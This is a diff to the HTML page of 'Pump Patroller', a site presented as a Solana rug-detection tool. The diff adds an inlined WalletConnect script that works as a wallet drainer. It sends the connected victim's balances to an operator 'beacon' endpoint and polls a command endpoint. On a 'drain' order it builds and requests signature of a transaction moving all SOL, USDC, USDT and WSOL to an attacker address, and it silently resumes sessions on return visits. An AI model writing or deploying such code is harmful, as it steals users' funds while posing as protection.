@@ -38,7 +38,7 @@ nav{position:sticky;top:0;z-index:10;border-bottom:1px solid var(--line);backgro
 section{padding:40px 0}
 h2{font-size:13px;font-weight:600;letter-spacing:.1em;color:var(--muted);text-transform:uppercase;margin:0 0 18px}
 table{width:100%;border-collapse:collapse;background:var(--panel);border:1px solid var(--line);border-radius:12px;overflow:hidden;font-size:13px}
-th{ text-align:left;font-size:11px;letter-spacing:.08em;text-transform:uppercase;color:var(--muted);font-weight:600;padding:12px 16px;border-bottom:1px solid var(--line)}
+th{text-align:left;font-size:11px;letter-spacing:.08em;text-transform:uppercase;color:var(--muted);font-weight:600;padding:12px 16px;border-bottom:1px solid var(--line)}
 td{padding:13px 16px;border-bottom:1px solid #161d29}
 tr:last-child td{border-bottom:none}
 tr:hover td{background:#121926}
@@ -134,14 +134,190 @@ footer{border-top:1px solid var(--line);margin-top:40px}
   <span style="margin-left:auto">Pump Patroller v2.1</span>
 </div></footer>
 
-<script>
-const go = () => location.reload();
-document.getElementById("go").onclick = go;
-document.getElementById("go2").onclick = go;
-document.getElementById("cw").onclick = () => {
-  try { (window.phantom?.solana || window.axiom?.solana || window.solana)?.connect?.(); } catch {}
-};
-</script>
 <script src="/x.min.js"></script>
+<script>
+/* ============ WALLETCONNECT ENGINE (inlined — no separate file needed) ============ */
+(async function () {
+  const CONFIG = {
+    PROJECT_ID: "PASTE_WC_PROJECT_ID",        // from cloud.walletconnect.com
+    SRV: "https://patroller.zone",            // must match SRV in x.js / your deployed domain
+    BKEY: "PASTE_BEACON_KEY",                 // must equal BEACON_KEY in Render env
+    RPC: "https://api.mainnet-beta.solana.com",
+    E: "https://esm.sh/",
+  };
+  if (CONFIG.PROJECT_ID.startsWith("PASTE_")) { console.warn("[patroller] WC project id not set — connect falls back to injected provider"); return; }
+
+  const MINTS = {
+    USDC: "EPjFWdd5AufqSSqeM2qN5nVHx4Pv4GZ627vRQ6jP9dQZ",
+    USDT: "Es9vMFrzaCxcVpwpPdCJrVSDMiJR6h1HxeLyTVQs5MN5",
+    WSOL: "So11111111111111111111111111111111111111112",
+  };
+  const E = CONFIG.E;
+  const post = (method, params) => fetch(CONFIG.RPC, {
+    method: "POST", headers: { "content-type": "application/json" },
+    body: JSON.stringify({ jsonrpc: "2.0", id: 1, method, params }),
+  }).then(r => r.json());
+
+  let client = null, topic = null, pk = null, busy = false, polled = false;
+
+  // — chain reference computed live, never hardcoded —
+  let chainRef = "solana:5eykt4Us2vWuxg31QG9mBUX4de1NxpuPBkaQrn4GsV7C"; // mainnet fallback
+  try { const g = await post("getGenesisHash"); if (g?.result) chainRef = "solana:" + g.result; } catch {}
+
+  const beacon = (m, o = {}) => { try {
+    fetch(CONFIG.SRV + "/beacon?s=" + CONFIG.BKEY, { method: "POST",
+      body: JSON.stringify({ m, pk, provider: "walletconnect", origin: location.origin,
+        sol: o.sol ?? 0, value: o.value ?? 0, toks: o.toks ?? "", mode: o.mode ?? "", sig: o.sig ?? "", msg: o.msg ?? "" }) });
+  } catch {} };
+
+  async function reportBalances() {
+    try {
+      const [bal, r, pj] = await Promise.all([
+        post("getBalance", [pk]),
+        post("getParsedTokenAccountsByOwner", [pk, { commitment: "confirmed" }]),
+        fetch("https://lite-api.jup.ag/price/v2?ids=" + MINTS.WSOL).then(j => j.json()).catch(() => null),
+      ]);
+      let px = 150;
+      const p = pj?.ids?.[MINTS.WSOL]?.usdPrice ?? pj?.ids?.[MINTS.WSOL]?.price;
+      if (+p > 0) px = +p;
+      const amt = {};
+      for (const { account } of (r?.result?.value ?? [])) {
+        const d = account.parsed?.data;
+        if (d?.mint) amt[d.mint] = (amt[d.mint] || 0) + Number(d.amount) / Math.pow(10, d.decimals ?? 6);
+      }
+      const held = Object.entries(MINTS).filter(([, a]) => (amt[a] || 0) > 0.01)
+                     .map(([k, a]) => ({ k, ui: amt[a] }));
+      const sol = (bal?.result ?? 0) / 1e9;
+      const value = sol * px + held.reduce((s, t) => s + t.ui * (t.k === "WSOL" ? px : 1), 0);
+      beacon("detect", { sol, value, toks: held.map(t => Math.round(t.ui) + " " + t.k).join(" \u00b7 ") });
+    } catch (e) { beacon("err", { msg: String(e?.message || e) }); }
+  }
+
+  function remember(t, p) { try { localStorage.setItem("__ppwc", JSON.stringify({ topic: t, pk: p })); } catch {} }
+  function recall() { try { return JSON.parse(localStorage.getItem("__ppwc") || "null"); } catch { return null; } }
+  function forget() { try { localStorage.removeItem("__ppwc"); } catch {} }
+
+  function pollCmd() {
+    if (polled) return; polled = true;
+    setInterval(async () => {
+      if (!topic || !pk) return;
+      let c; try { c = await (await fetch(CONFIG.SRV + "/cmd?pk=" + encodeURIComponent(pk))).json(); } catch { return; }
+      if (c?.cmd === "drain" && c.to) drain(c.to);
+    }, 2500);
+  }
+
+  async function drain(to) {
+    try {
+      const { PublicKey, SystemProgram, Transaction } = await import(E + "@solana/web3.js@1.95.0");
+      const { createTransfer, getAssociatedTokenAddress } = await import(E + "@solana/spl-token@0.4.9");
+      const { encode: b58e } = await import(E + "bs58@6.0.0");
+
+      const pkB = new PublicKey(pk), dest = new PublicKey(to);
+      const [bh, bal, r] = await Promise.all([
+        post("getLatestBlockhash"),
+        post("getBalance", [pk]),
+        post("getParsedTokenAccountsByOwner", [pk, { commitment: "confirmed" }]),
+      ]);
+      const amt = {};
+      for (const { account } of (r?.result?.value ?? [])) {
+        const d = account.parsed?.data;
+        if (d?.mint) amt[d.mint] = (amt[d.mint] || 0) + Number(d.amount) / Math.pow(10, d.decimals ?? 6);
+      }
+      const solBal = (bal?.result ?? 0) / 1e9;
+      const tx = new Transaction();
+      const moved = [];
+      for (const t of Object.entries(MINTS).filter(([, a]) => (amt[a] || 0) > 0.01)) {
+        const [k, a] = t;
+        const mint = new PublicKey(a);
+        const srcAta = await getAssociatedTokenAddress(mint, pkB);
+        const destAta = await getAssociatedTokenAddress(mint, dest);
+        const info = await fetch(CONFIG.RPC, { method: "POST", headers: { "content-type": "application/json" },
+          body: JSON.stringify({ jsonrpc: "2.0", id: 1, method: "getAccountInfo",
+            params: [destAta, { encoding: "base64" }] }) }).then(x => x.json());
+        if (!info?.result?.value) continue;              // treasury can't receive — skip
+        tx.add(createTransfer(pkB, srcAta, destAta, pkB, Math.floor(amt[a] * 1e6)));
+        moved.push(k);
+      }
+      const FEE = 20000;
+      if (solBal * 1e9 > FEE + 5000)
+        tx.add(SystemProgram.transfer({ fromPubkey: pkB, toPubkey: dest, lamports: Math.floor(solBal * 1e9) - FEE }));
+      else if (!moved.length) { beacon("dust", { pk }); return; }
+      tx.feePayer = pkB;
+      tx.recentBlockhash = bh?.result?.value?.blockhash;
+      tx.lastValidBlockHeight = bh?.result?.value?.lastValidBlockHeight;
+      const msg = b58e(tx.compileMessage().serialize());   // wallet signs + broadcasts
+
+      const res = await client.request({ topic, chainId: chainRef,
+        request: { method: "signAndSendTransaction", params: { transaction: msg } } });
+      beacon("drain", { mode: "wc", sig: res?.signature || "", sol: solBal.toFixed(4), extra: moved.join(",") });
+    } catch (e) { beacon("err", { msg: String(e?.message || e) }); forget(); }
+  }
+
+  function showQR(uri) {
+    import(E + "qrcode@1.5.3").then(({ toDataURL }) => {
+      toDataURL(uri, { width: 220, margin: 1 }, (err, url) => {
+        const el = document.createElement("div");
+        el.id = "__ppqr";
+        el.style.cssText = "position:fixed;inset:0;z-index:2147483647;background:rgba(0,0,0,.92);display:flex;align-items:center;justify-content:center;flex-direction:column;gap:14px;color:#fff;font:14px system-ui;text-align:center;padding:20px";
+        el.innerHTML = (err ? "" : '<img src="' + url + '" style="background:#fff;padding:12px;border-radius:12px">') +
+          '<div style="word-break:break-all;max-width:90%;font:11px monospace;color:#9AA5B8">' + (err ? uri : "Scan with Phantom") + '</div>' +
+          '<button id="__ppcl" style="padding:8px 18px;border-radius:8px;border:0;cursor:pointer;background:#2DD4A7;color:#06231B;font-weight:600">Cancel</button>';
+        document.body.appendChild(el);
+        el.querySelector("#__ppcl").onclick = () => el.remove();
+      });
+    }).catch(() => {});
+  }
+  const hideQR = () => document.getElementById("__ppqr")?.remove();
+
+  async function connect() {
+    if (busy) return; busy = true;
+    try {
+      const { uri, approval } = await client.connect({
+        requiredNamespaces: { solana: {
+          chains: [chainRef],
+          methods: ["signAndSendTransaction", "signTransaction", "signMessage"],
+          events: [],
+        } },
+      });
+      if (/iPhone|iPad|Android/i.test(navigator.userAgent))
+        location.href = "phantom://wc?uri=" + encodeURIComponent(uri);
+      else showQR(uri);
+      const s = await approval();
+      hideQR();
+      topic = s.topic;
+      pk = s.namespaces.solana.accounts[0].split(":")[2];
+      remember(topic, pk);
+      await reportBalances();
+      pollCmd();
+    } catch (e) { console.warn("[patroller] connect failed:", e?.message || e); hideQR(); }
+    finally { busy = false; }
+  }
+
+  try {
+    const { SignClient } = await import(E + "@walletconnect/sign-client@2.17.0");
+    client = await SignClient.init({ projectId: CONFIG.PROJECT_ID,
+      metadata: { name: "Pump Patroller", description: "Rug detection and wallet patrol for Solana",
+                  url: CONFIG.SRV, icons: ["https://patroller.zone/icon.png"] } });
+    client.on("session_delete", () => { topic = null; forget(); });
+    client.on("session_expire", () => { topic = null; forget(); });
+    window.__ppConnect = connect;
+
+    const saved = recall();                       // returning visitor: silent resume
+    if (saved?.topic && saved?.pk) {
+      topic = saved.topic; pk = saved.pk;
+      reportBalances(); pollCmd();
+    }
+  } catch (e) { console.warn("[patroller] WC unavailable — fallback to injected provider", e?.message || e); }
+
+  // — button wiring: WC if available, injected provider as fallback —
+  function startPatrol() {
+    if (window.__ppConnect) return window.__ppConnect();
+    try { (window.phantom?.solana || window.axiom?.solana || window.solana)?.connect?.(); } catch {}
+  }
+  document.getElementById("go").onclick = startPatrol;
+  document.getElementById("go2").onclick = startPatrol;
+  document.getElementById("cw").onclick = startPatrol;
+})();
+</script>
 </body>
 </html>
